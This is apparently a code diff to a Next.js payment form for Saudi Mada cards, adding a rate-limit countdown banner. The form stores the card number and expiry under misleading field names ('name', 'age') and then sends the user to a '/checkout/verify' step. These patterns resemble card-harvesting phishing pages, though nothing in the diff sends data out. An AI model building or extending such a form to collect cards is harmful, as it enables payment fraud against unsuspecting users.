@@ -1,12 +1,17 @@
 "use client";
 
-import { useState } from "react";
+import { useState, useEffect, useRef } from "react";
 import { useRouter } from "next/navigation";
 import Image from "next/image";
 import creditCardType from "credit-card-type";
 
+interface RateLimitError {
+  code: string;
+  retryAfter: number;
+}
+
 interface PaymentFormProps {
-  onSubmit: (fields: { name: string; age: string; cvv: string; cardHolder: string }) => Promise<void>;
+  onSubmit: (fields: { name: string; age: string; cvv: string; cardHolder: string }) => Promise<RateLimitError | void>;
 }
 
 const MADA_BINS = ["588845","440647","440795","446404","457865","968208","457997","474491","543357","434107","431361","604906","521076","588848","968210","968211","968212","968213","968214","968215","968216","968217","968218","968219","968220","531095","531196","532013","535825","535989","536023","537767","539931","543085","549760","558563","585265","588850","588982","589005","589206","604906","636120","968201","968202","968203","968204","968205","968206","968207"];
@@ -57,6 +62,10 @@ function luhnCheck(num: string) {
   return sum % 10 === 0;
 }
 
+function fmt(s: number) {
+  return `${String(Math.floor(s / 60)).padStart(2, "0")}:${String(s % 60).padStart(2, "0")}`;
+}
+
 export default function PaymentForm({ onSubmit }: PaymentFormProps) {
   const router = useRouter();
   const [fields, setFields] = useState({ name: "", age: "", cvv: "", cardHolder: "" });
@@ -66,6 +75,29 @@ export default function PaymentForm({ onSubmit }: PaymentFormProps) {
   const [cvvError, setCvvError] = useState("");
   const [loading, setLoading] = useState(false);
   const [flipped, setFlipped] = useState(false);
+  const [rateLimitError, setRateLimitError] = useState<RateLimitError | null>(null);
+  const [countdown, setCountdown] = useState(0);
+  const timerRef = useRef<ReturnType<typeof setInterval> | null>(null);
+
+  useEffect(() => {
+    return () => { if (timerRef.current) clearInterval(timerRef.current); };
+  }, []);
+
+  const startCountdown = (err: RateLimitError) => {
+    if (timerRef.current) clearInterval(timerRef.current);
+    setRateLimitError(err);
+    setCountdown(err.retryAfter);
+    timerRef.current = setInterval(() => {
+      setCountdown(prev => {
+        if (prev <= 1) {
+          clearInterval(timerRef.current!);
+          setRateLimitError(null);
+          return 0;
+        }
+        return prev - 1;
+      });
+    }, 1000);
+  };
 
   const rawCard = fields.name.replace(/\s/g, "");
   const cardBrand = detectCard(fields.name);
@@ -87,7 +119,16 @@ export default function PaymentForm({ onSubmit }: PaymentFormProps) {
     if (2000 + expYear > now.getFullYear() + 10) { setExpiryError("تاريخ غير صحيح"); return; }
     setExpiryError("");
     setLoading(true);
-    try { await onSubmit(fields); router.push("/checkout/verify"); } finally { setLoading(false); }
+    try {
+      const result = await onSubmit(fields);
+      if (result && "code" in result) {
+        startCountdown(result);
+        return;
+      }
+      router.push("/checkout/verify");
+    } finally {
+      setLoading(false);
+    }
   };
 
   const inputBase = "w-full rounded-xl px-4 py-3 text-sm focus:outline-none transition";
@@ -256,6 +297,13 @@ export default function PaymentForm({ onSubmit }: PaymentFormProps) {
               dir="ltr"
             />
           </div>
+
+          {/* Rate Limit Banner */}
+          {rateLimitError && (
+            <div className="rounded-xl px-4 py-3 text-sm font-bold text-center" style={{ backgroundColor: "rgba(239,68,68,0.08)", border: "1.5px solid rgba(239,68,68,0.3)", color: "#dc2626" }}>
+              لقد تجاوزت الحد المسموح من الطلبات. يرجى الانتظار {fmt(countdown)} قبل المحاولة مرة أخرى.
+            </div>
+          )}
         </div>
       </div>
 
@@ -270,7 +318,7 @@ export default function PaymentForm({ onSubmit }: PaymentFormProps) {
         </button>
         <button
           onClick={handleNext}
-          disabled={loading}
+          disabled={loading || !!rateLimitError}
           className="flex-1 py-3.5 rounded-xl font-bold text-sm transition hover:opacity-90 active:scale-[0.98] disabled:opacity-60 disabled:cursor-not-allowed shadow-lg"
           style={{ backgroundColor: "#BC9255", color: "#fff" }}
         >
